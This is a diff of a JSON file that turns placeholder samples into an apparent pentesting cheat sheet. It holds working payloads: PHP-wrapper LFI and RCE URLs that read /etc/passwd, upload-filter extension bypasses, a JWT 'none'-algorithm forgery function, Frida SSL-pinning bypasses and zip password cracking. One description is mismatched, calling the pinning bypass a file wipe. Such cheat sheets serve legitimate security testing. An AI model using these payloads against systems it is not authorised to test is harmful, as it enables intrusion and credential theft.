@@ -1,45 +1,111 @@
 [
 	{
-		"title": "simple sample",
-		"description": "this is just a sample",
-		"data":{
-			"description 1": "!code command 1",
-			"descriptions 2": "command 2"
-		},
-		"tags": ["tag 1", "tag 2", "tag 3"],
-		"keywords": ["keyword 1", "keyword 2"]
-	},
-	{
-		"title": "second sample lol",
-		"description": "this is yet another sample",
-		"data":{
-			"description 1": "!code command 1",
-			"descriptions 2": "command 2"
-		},
-		"tags": ["tag 1", "tag 2", "tag 3"],
-		"keywords": ["keyword 1", "keyword 2"]
-	},
-	{
-		"title": "third sample ok",
+		"title": "Extract all endpoints from a javascript file",
 		"description": "",
 		"data":{
-			"description 1": "!code command 1",
-			"descriptions 2": "command 2"
+			"": "!bash cat files.txt | grep -aoP \"(?<=(\\\"|\\'|`))\\\/[a-zA-Z0-9?&=\\\/-#.](?=(\\\"|\\'|`))\" | sort -u | tee output.txt",
+			"Or, alternatively:": "!bash grep -aoP files.txt \"(?<=(\\\"|\\'|`))\\\/[a-zA-Z0-9?&=\\\/-#.](?=(\\\"|\\'|`))\" | sort -u | tee output.txt"
 		},
-		"tags": ["tag 1", "tag 2", "tag 3"],
-		"keywords": ["keyword 1", "capeta"]
+		"tags": ["enumeration", "oneliner", "web"]
 	},
 	{
-		"title": "last sample until now",
-		"description": "alright this is the third one let's see what's going on here",
+		"title": "List the last 10 files modified on a folder",
+		"description": "",
 		"data":{
-			"description 1": "!code command 1",
-			"description 2": "command 1",
-			"description 3": "!code command 1",
-			"descriptions 4": "command 2"
+			"": "!bash find $1 -type f -exec stat --format '%Y :%y %n' \"{}\" \\; | sort -nr | cut -d: -f2- | head"
 		},
-		"tags": ["tag 1", "tag 2", "tag 3"],
-		"keywords": ["keyword 1", "keyword 2"]
+		"tags": ["linux", "forensics"]
+	},
+	{
+		"title": "Find potential IDOR on BurpSuite",
+		"description": "",
+		"data":{
+			"Filter by search term (with regex) on Burp's proxy tab:": "(?i)\\b\\w*id\\b(?!\\w)\\s*=\\s*(\"[^\"]*\"|'[^']*'|[^&\\s}]*)"
+		},
+		"tags": ["web", "IDOR"]
+	},
+	{
+		"title": "Emulate a MySQL interactive shell",
+		"description": "PHP script to emulate a MySQL interactive shell in a host. Use it if there is no MySQL client available.",
+		"data":{
+			"": "!php <?php\n\n$host = 'localhost';\n$username = 'your_username';\n$password = 'your_password';\n$database = 'your_database';\n\n$mysqli = new mysqli($host, $username, $password, $database);\n\nif ($mysqli->connect_error)\n    die(\"Connection failed: \" . $mysqli->connect_error);\n\necho \"Connected to MySQL. Type 'exit' to quit.\\n\";\n\nwhile(1){\n    $input = readline(\"mysql> \");\n    \n    if($input === 'exit')\n        break;\n\n    $result = $mysqli->query($input);\n\n    if(!$result)\n        echo \"Error: \" . $mysqli->error . \"\\n\";\n    else{\n        if($result->num_rows > 0){\n            while($row = $result->fetch_assoc())\n                print_r($row);\n        }else{\n            echo \"Query OK, \" . $mysqli->affected_rows . \" rows affected\\n\";\n        }\n        $result->free();\n    }        \n}\n\n$mysqli->close();\necho \"Exited MySQL shell.\\n\";"
+		},
+		"tags": ["web", "snippet", "PHP", "MySQL"]
+	},
+	{
+		"title": "Read files/RCE with PHP wrappers",
+		"description": "Exploiting local file inclusion (LFI) with php filters",
+		"data":{
+			"PHP wrapper:": "fulano.com/view.php?file=php://filter/resource=../../../../etc/passwd",
+			"PHP wrapper (base64):": "fulano.com/view.php?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd",
+			"RCE through PHP data wrapper:": "fulano.com/view.php?file=data://text/plan,%3C?php%20system(%27cat%20/etc/passwd%27);%20?%3E",
+			"RCE through PHP data wrapper with base64:": "fulano.com/view.php?file=data://text/plan;base64,PD9waHAgc3lzdGVtKGlkkTs/Ph=="
+		},
+		"tags": ["web", "LFI", "RCE"]
+	},
+	{
+		"title": "File upload extension bypass",
+		"description": "Modify the file extension and bypass filters on file uploads",
+		"data":{
+			"Alternative PHP extensions:": ".php, .phtml, .php3, .php4, .php5, .php7, .phps, .php-s, .pht, .phar, .inc",
+			"Bypass contains():": ".jpg.php, .jpg.php5, .jpg.phtml",
+			"Bypass pathinfo():": ".php%00.jpg, .php5%00.jpg",
+			"Bypass pathinfo() [double encoding]:": ".php%2500.jpg, .php5%2500.jpg"
+		},
+		"tags": ["web", "upload", "RCE", "bypass"]
+	},
+	{
+		"title": "Crack zip file password",
+		"description": "Extract the hash of a zip file and crack it based on a wordlist",
+		"data":{
+			"": "!bash zip2john file.zip > hash.txt\njohn hash.txt\njohn hash.txt --show"
+		},
+		"tags": ["cracking", "zip", "crypto"]
+	},
+	{
+		"title": "Geolocate IP address",
+		"description": "Quickly get info about an IP address (country, city, provider, etc.)",
+		"data":{
+			"Substitute <IP ADDRESS>:": "!bash curl -s http://ip-api.com/json/<IP ADDRESS> | jq"
+		},
+		"tags": ["bash", "osint", "misc"]
+	},
+	{
+		"title": "Passively enumerate subdomains",
+		"description": "List subdomains based on SSL cerificates with crt.sh",
+		"data":{
+			"Substitute <URL>:": "!bash curl -s \"https://crt.sh/?q=<URL>\" | tr '\\n' , | grep -oi \"<table>.*</table>\" | sed \"s/<TR>/\\n/g\" | cut -d , -f 6 | sed -E \"s/(<[^>]*>|^ +|.*Logged At.*)//g\" | sort | sort -u"
+		},
+		"tags": ["bash", "osint", "misc"]
+	},
+	{
+		"title": "Extract shell code from object file",
+		"description": "Bash function to get a file.o and return the corresponding shellcode",
+		"data":{
+			"": "!bash function obj2sh(){\r\n    objdump -d -M intel-mnemonic \"$1\" | \\\r\n    grep '[0-9a-f]:'|\\\r\n    grep -v 'file'|\\\r\n    cut -f2 -d:|\\\r\n    cut -f1-6 -d' '|\\\r\n    tr -s ' '|\\\r\n    tr '\\t' ' '|\\\r\n    sed 's\/ $\/\/g'|\\\r\n    sed 's\/ \/\\\\x\/g'|\\\r\n    paste -d '' -s\r\n}"
+		},
+		"tags": ["binary exploitation", "misc", "bash"]
+	},
+	{
+		"title": "Set 'none' as a JWT algorythm",
+		"description": "Get a JWT and returns it with 'none' as its algorythm, and without signature",
+		"data":{
+			"": "!bash function jwtnonefy(){\r\n   header=$(echo \"$1\" | \\\r\n          cut -d. -f1 | \\\r\n          base64 -d | \\\r\n          sed -E \"s\/\\\"alg\\\":\\\"([^\\\"]+)\\\"\/\\\"alg\\\":\\\"none\\\"\/g\" | \\\r\n          base64 | \\\r\n          sed 's\/=\/\/g');\r\n   payload=$(echo \"$1\" | cut -d. -f 2);\r\n   echo -e \"\\n\"$header.$payload.\r\n}"
+		},
+		"tags": ["bash", "jwt", "web", "bug bounty"]
+	},
+	{
+		"title": "SSL pinning bypass on Android app",
+		"description": "Overwrite a file's content 40 times with random patterns, permanently erasing it",
+		"data":{
+			"Substitute <com.example.app>": "!bash frida --codeshare akabe1/frida-multiple-unpinning -f <com.example.app>",
+			" ": "!bash frida --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida -f <com.example.app>",
+			"  ":"!bash frida --codeshare Eltion/instagram-ssl-pinning-bypass -f <com.example.app>",
+			"   ":"!bash frida --codeshare sowdust/universal-android-ssl-pinning-bypass-2 -f <com.example.app>",
+			"    ":"!bash frida --codeshare masbog/frida-android-unpinning-ssl -f <com.example.app>",
+			"     ":"!bash frida --codeshare akabe1/frida-universal-pinning-bypasser -f <com.example.app>",
+			"      ":"!bash frida --codeshare pbalmelle/android-ssl-bypass -f <com.example.app>"
+		},
+		"tags": ["mobile", "crypto", "android", "bypass"]
 	}
-
 ]
